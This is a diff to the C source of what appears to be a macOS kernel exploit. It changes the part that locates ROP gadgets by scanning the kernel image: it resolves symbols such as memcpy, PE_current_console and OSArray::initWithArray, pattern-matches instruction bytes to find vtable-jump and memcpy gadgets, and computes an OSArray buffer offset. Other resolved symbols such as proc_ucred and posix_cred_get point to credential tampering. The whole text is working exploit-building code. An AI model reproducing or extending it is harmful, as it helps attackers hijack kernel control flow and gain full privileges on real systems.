@@ -1,5 +1,5 @@
 #include <stdint.h>             // uint64_t
-#include <string.h>             // memmem
+#include <string.h>             // memmem, memchr
 
 #include <mach/mach.h>
 
@@ -12,6 +12,7 @@
 #define _ZTV8OSObject OSObject_vtab
 #define _ZNK8OSObject13taggedReleaseEPKv OSObject_taggedRelease
 #define _ZNK12OSSerializer9serializeEP11OSSerialize OSSerializer_serialize
+#define _ZN7OSArray13initWithArrayEPKS_j OSArray_initWithArray
 
 #define STRINGIFY_EXPAND(s) #s
 
@@ -51,8 +52,9 @@ do \
 } while(0)
 
 #define LE32(ptr) (((ptr)[0] | ((ptr)[1] << 8) | ((ptr)[2] << 16) | ((ptr)[3] << 24)))
+#define CALL_OFF(ptr) ((((int64_t)((ptr)[2] | ((ptr)[3] << 8) | ((ptr)[4] << 16)) << 40) >> 32) + 0x100)
 
-uint8_t gad__add__rdi__ecx[]                    = { 0x01, 0x0f, 0x97, 0xc3 };       // add [rdi], ecx; xchg eax, edi; ret;
+//uint8_t gad__add__rdi__ecx[]                    = { 0x01, 0x0f, 0x97, 0xc3 };       // add [rdi], ecx; xchg eax, edi; ret;
 uint8_t gad__mov_rdi__rax_8__call__rax_[]       = { 0x48, 0x8b, 0x78, 0x08, 0xff, 0x10 }; // mov rdi, [rax + 8]; call [rax];
 uint8_t gad__mov_rsp_rsi_call_rdi[]             = { 0x48, 0x89, 0xf4, 0xff, 0xd7 }; // mov rsp, rsi; call rdi;
 uint8_t gad__add_rsp_0x28[]                     = { 0x48, 0x83, 0xc4, 0x28, 0xc3 }; // add rsp, 0x28; ret;
@@ -88,11 +90,14 @@ int rop_gadgets(rop_t *rop, void *k)
                 SYM(_ZTV8OSObject);
                 SYM(_ZNK8OSObject13taggedReleaseEPKv);
                 SYM(_ZNK12OSSerializer9serializeEP11OSSerialize);
+                SYM(_ZN7OSArray13initWithArrayEPKS_j);
                 SYM(kOSBooleanTrue);
                 SYM(current_proc);
                 SYM(proc_ucred);
                 SYM(posix_cred_get);
                 SYM(bzero);
+                SYM(memcpy);
+                SYM(PE_current_console);
                 SYM(vm_map_remap);
                 SYM(mach_vm_wire);
                 SYM(ipc_port_alloc_special);
@@ -113,11 +118,14 @@ int rop_gadgets(rop_t *rop, void *k)
     ENSURE(_ZTV8OSObject);
     ENSURE(_ZNK8OSObject13taggedReleaseEPKv);
     ENSURE(_ZNK12OSSerializer9serializeEP11OSSerialize);
+    ENSURE(_ZN7OSArray13initWithArrayEPKS_j);
     ENSURE(kOSBooleanTrue);
     ENSURE(current_proc);
     ENSURE(proc_ucred);
     ENSURE(posix_cred_get);
     ENSURE(bzero);
+    ENSURE(memcpy);
+    ENSURE(PE_current_console);
     ENSURE(vm_map_remap);
     ENSURE(mach_vm_wire);
     ENSURE(ipc_port_alloc_special);
@@ -141,7 +149,7 @@ int rop_gadgets(rop_t *rop, void *k)
             if((seg->initprot & VM_PROT_EXECUTE) != 0)
             {
                 void *base = kernel + seg->fileoff;
-                GADGET(add__rdi__ecx);
+                //GADGET(add__rdi__ecx);
                 GADGET(mov_rdi__rax_8__call__rax_);
                 GADGET(mov_rsp_rsi_call_rdi);
                 GADGET(add_rsp_0x28);
@@ -167,11 +175,11 @@ int rop_gadgets(rop_t *rop, void *k)
             {
                 // Quick & dirty
                 void *func = kernel + (addr + seg->fileoff - seg->vmaddr);
-                char *load = memmem(func, 0x80, (uint8_t[]){ 0x48, 0x8d, 0x3d }, 3); // lea rdi, ...
+                char *load = memmem(func, 0x40, (uint8_t[]){ 0x48, 0x8d, 0x3d }, 3); // lea rdi, ...
                 if(load)
                 {
-                    rop->_hibernateStats = (load - kernel + seg->vmaddr) + 7 +  // rip
-                                           LE32((uint8_t*)&load[3]);            // offset
+                    rop->_hibernateStats = (load - kernel - seg->fileoff + seg->vmaddr) + 7 +   // rip
+                                           LE32((uint8_t*)&load[3]);                            // offset
                     LOG("%-30s: 0x%016llx", "_hibernateStats", rop->_hibernateStats);
                 }
             }
@@ -191,13 +199,27 @@ int rop_gadgets(rop_t *rop, void *k)
                     }
                 }
             }
+
+            // OSArray array buffer member offset
+            addr = rop->OSArray_initWithArray;
+            if(addr >= seg->vmaddr && addr < seg->vmaddr + seg->vmsize)
+            {
+                void *func = kernel + (addr + seg->fileoff - seg->vmaddr);
+                uint8_t *load = memmem(func, 0x40, (uint8_t[]){ 0x48, 0x8b, 0x4e }, 3); // mov rcx, [rsi + ...]
+                if(load)
+                {
+                    rop->OSArray_array_offset = load[3];
+                    LOG("%-30s: 0x%016llx", "OSArray_array_offset", rop->OSArray_array_offset);
+                }
+            }
         }
     }
 
     ENSURE(_hibernateStats);
     ENSURE(taggedRelease_vtab_offset); // even this can never be 0, since destructor is first in vtab
+    ENSURE(OSArray_array_offset);
 
-    ENSURE(add__rdi__ecx);
+    //ENSURE(add__rdi__ecx);
     ENSURE(mov_rdi__rax_8__call__rax_);
     ENSURE(mov_rsp_rsi_call_rdi);
     ENSURE(add_rsp_0x28);
@@ -215,6 +237,61 @@ int rop_gadgets(rop_t *rop, void *k)
     ENSURE(mov_rsi_rax_pop_rbp_jmp_rcx);
     ENSURE(mov_rdx_rax_pop_rbp_jmp_rcx);
     ENSURE(sub_rax_rdi_pop_rbp);
+
+    if(rop->taggedRelease_vtab_offset > 0xff) // needs to fit into uint8_t
+    {
+        ERR("taggedRelease_vtab_offset is too large");
+        return -1;
+    }
+
+    uint8_t off = (uint8_t)rop->taggedRelease_vtab_offset;
+    uint8_t gad__jmp__vtab1_[]              = { 0xff, 0x60, off };                          // jmp [rax + 0x50];
+    uint8_t gad__mov_rsi_r15_call__vtab0_[] = { 0x4c, 0x89, 0xfe, 0xff, 0x50, off - 8 };    // mov rsi, r15; call [rax + 0x48];
+
+    FOREACH_CMD(kernel, cmd)
+    {
+        if(cmd->cmd == LC_SEGMENT_64)
+        {
+            seg_t *seg = (seg_t*)cmd;
+
+            // ROP gadgets
+            if((seg->initprot & VM_PROT_EXECUTE) != 0)
+            {
+                void *base = kernel + seg->fileoff;
+                GADGET(jmp__vtab1_);
+                GADGET(mov_rsi_r15_call__vtab0_);
+            }
+
+            // memcpy gadget
+            uint64_t addr = rop->PE_current_console;
+            if(addr >= seg->vmaddr && addr < seg->vmaddr + seg->vmsize)
+            {
+                void *func = kernel + (addr + seg->fileoff - seg->vmaddr);
+                uint8_t *ret = memchr(func, 0xc3, 0x40); // ret
+                if
+                (
+                    ret &&
+                    ret[-1]  == 0x5d && // pop rbp
+                    ret[-2]  == 0xc0 && ret[-3] == 0x31 && // xor eax, eax
+                    ret[-7]  == 0xfb && ret[-8] == 0xe8 && // call ...
+                    ((char*)&ret[-8] - kernel - seg->fileoff + seg->vmaddr) + CALL_OFF(&ret[-8]) == rop->memcpy &&
+                    ret[-13] == 0xba // mov edx, ...
+                )
+                {
+                    uint32_t imm = LE32(&ret[-12]);
+                    if(imm >= rop->OSArray_array_offset + 8 && imm <= 0x100) // acceptable ranges
+                    {
+                        rop->memcpy_gadget = (char*)&ret[-13] - kernel - seg->fileoff + seg->vmaddr;
+                        LOG("%-30s: 0x%016llx", "memcpy_gadget", rop->memcpy_gadget);
+                    }
+                }
+            }
+        }
+    }
+
+    ENSURE(memcpy_gadget);
+    ENSURE(jmp__vtab1_);
+    ENSURE(mov_rsi_r15_call__vtab0_);
 
     return 0;
 }
